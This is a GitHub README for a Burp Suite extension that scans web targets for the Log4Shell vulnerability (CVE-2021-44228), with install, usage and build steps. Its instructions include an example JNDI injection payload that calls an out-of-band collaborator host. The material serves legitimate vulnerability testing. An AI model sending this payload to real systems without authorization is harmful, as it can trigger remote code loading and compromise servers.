<h1 align="center">
  <br>
  Log4J Scanner
</h1>

<h4 align="center">Burp extension to scan Log4Shell (CVE-2021-44228) vulnerability with custom payloads.</h4>

---

<p align="center">
  <a href="https://github.com/0xDexter0us/Log4J-Scanner/releases">
    <img src="https://img.shields.io/github/release/0xDexter0us/Log4J-Scanner.svg">
  </a>
  <a href="https://github.com/0xDexter0us/Log4J-Scanner/releases">
    <img src="https://img.shields.io/github/downloads/0xDexter0us/Log4J-Scanner/total?label=downloads&logo=github&color=inactive">
  </a>
  <a href="https://github.com/0xDexter0us/Log4J-Scanner/">
      <img src="https://img.shields.io/github/stars/0xDexter0us/Log4J-Scanner.svg?style=social&label=Stars">
  </a>
  <a href="https://github.com/0xDexter0us/Log4J-Scanner/">
    <img src="https://img.shields.io/github/followers/0xDexter0us.svg?style=social&label=Follow">
  </a>
  <a href="https://twitter.com/intent/follow?screen_name=0xDexter0us">
      <img src="https://img.shields.io/twitter/follow/0xDexter0us.svg?style=social&label=Follow">
  </a>
  <a href="https://discord.gg/bugbounty">
      <img src="https://img.shields.io/badge/chat-on%20discord-7289da.svg">
  </a>

</p>

---
## Disclaimer
> I am not responsible for your actions, burp-suite freezing, target getting hacked, thermonuclear war, or the current economic crisis caused by you following these directions. YOU are choosing to use this tool, and if you point your finger at me for messing anything up, I will LMAO at you.

---
![Usage Gif](https://github.com/0xDexter0us/Log4J-Scanner/blob/main/images/usage.gif)

## Instructions:
 - Install the extension either from pre-compiled releases or build from source.
 - Disable/Uncheck all other active scanning extensions like active scan++, burp bounty pro, param-miner etc.
 - From Top-Menu open settings of Log4J Scanner.
 - Add your custom payload and save settings.
 - Select your target > right-click > Scan.
 - Select `Scan Configuration` > `Select from library`
 - Only select `Audit checks - extensions only` and hit OK button.

Special thanks to [Silent Signal](https://github.com/silentsignal), instructions and scan configurations are inspired from his extension.


### Important instructions to remember:
 - In your custom payload DO __NOT__ add your collaborator url, just add `[collaborator-server]` as a placeholder,
 - `[collaborator-server` will be replaced by your collaborator server url itself.
 - Example payload: `"${jndi:ldap://[collaborator-server]/a}`


## Download releases
`https://github.com/0xDexter0us/Log4J-Scanner/releases/`

## Build from source
* `./gradlew build fatJar`
* Grab the jar file `build/libs/Log4J-Scanner-x.x.x.jar`

## Installation
1. Download the latest jar from releases or build from source.
2. Add the jar to Burp Suite.



#### If you like the project, please give the repo a star! <3

## Resources

- For passive scanning: `https://github.com/f0ng/log4j2burpscanner`
- For active scanning: `https://github.com/albinowax/ActiveScanPlusPlus` & `https://github.com/silentsignal/burp-log4shell`


## Changelog
**25 December 2021 - v0.2.0**
 - Added Burp Collaborator api.
 - Removed custom scanner.
 - Added Burp scanner api.

**13 December 2021 - v0.1.0**
 - First public release

## Thanks To

* CoreyD97 - https://github.com/CoreyD97
* Silent Signal - https://github.com/silentsignal


### This was coded be me within a day and is an initial release, bug might occur, bug reports, suggestions and pull requests all are welcome :)

-----

[![Join our Discord server!](https://invidget.switchblade.xyz/bugbounty)](http://discord.gg/bugbounty)

[![ko-fi](https://ko-fi.com/img/githubbutton_sm.svg)](https://ko-fi.com/Q5Q76ZT6K)
